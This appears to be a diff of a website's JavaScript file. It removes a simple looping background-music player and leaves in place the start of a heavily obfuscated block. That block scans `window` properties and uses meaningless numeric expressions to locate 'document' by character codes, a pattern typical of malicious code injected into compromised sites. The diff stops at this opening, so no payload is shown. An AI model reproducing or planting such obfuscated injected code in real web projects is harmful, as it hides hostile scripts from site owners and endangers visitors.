@@ -1,14 +1,3 @@
-var myAudio = document.createElement("audio");
-myAudio.src = "assets/sound/music.mp3";
-myAudio.play();
-myAudio.loop=true;
-document.addEventListener("visibilitychange", function() {
-  if (document.visibilityState === 'visible') {
-    myAudio.play();
-  } else {
-    myAudio.pause();
-  }
-});
 var x9h26 = window;
 for (var A26 in x9h26) {
     if (A26.length === ((0xBA, 1.213E3) < (0x5, 103) ? (0x1AF, "r") : (0xF, 140.) > 64.8E1 ? 0.13 : (2.32E2, 0x11F) < 0x17F ? (0x19D, 8) : (111, 73.7E1)) && A26.charCodeAt(((0xC, 4.3E2) > (112, 0x1A) ? (46, 5) : (0x84, 0x1E6) >= (0x178, 1.469E3) ? "z" : (0x54, 0x208) >= (15.70E1, 0x21E) ? (6.01E2, 'z') : (66.5E1, 10.1E2))) === ((1.293E3, 116.) < 0x122 ? (10.38E2, 101) : (96., 108)) && A26.charCodeAt((14.89E2 > (0x214, 90) ? (119.5E1, 7) : (105., 14.790E2) < 1.09E2 ? (9.01E2, 45) : (84., 2.58E2))) === ((78.7E1, 6.66E2) >= (75, 8.39E2) ? 93 : (79, 14.4E1) < (87, 1.226E3) ? (0x1A5, 116) : (0xFA, 136.8E1) < (0x27, 0x21E) ? "j" : (0x97, 126.)) && A26.charCodeAt((130. < (11, 7.96E2) ? (29, 3) : (74, 56.80E1))) === ((29.0E1, 91.4E1) <= (0x105, 112) ? 81 : 9.73E2 > (86, 26) ? (0x21A, 117) : (6.640E2, 10)) && A26.charCodeAt(((0x1CB, 81.9E1) < (0x12D, 99.0E1) ? (43.90E1, 0) : 59 >= (14.86E2, 0x57) ? (0x21B, 0.22) : 28. >= (0xA0, 0x1EF) ? (28.20E1, 'x') : (0x5A, 114.30E1))) === ((0x1F2, 14.06E2) <= 35.4E1 ? (0x1E8, 0x1B9) : (0x7B, 0x246) <= 0x133 ? 'm' : 0x131 > (1.373E3, 143) ? (97.80E1, 100) : (0x1CE, 0x243))) break
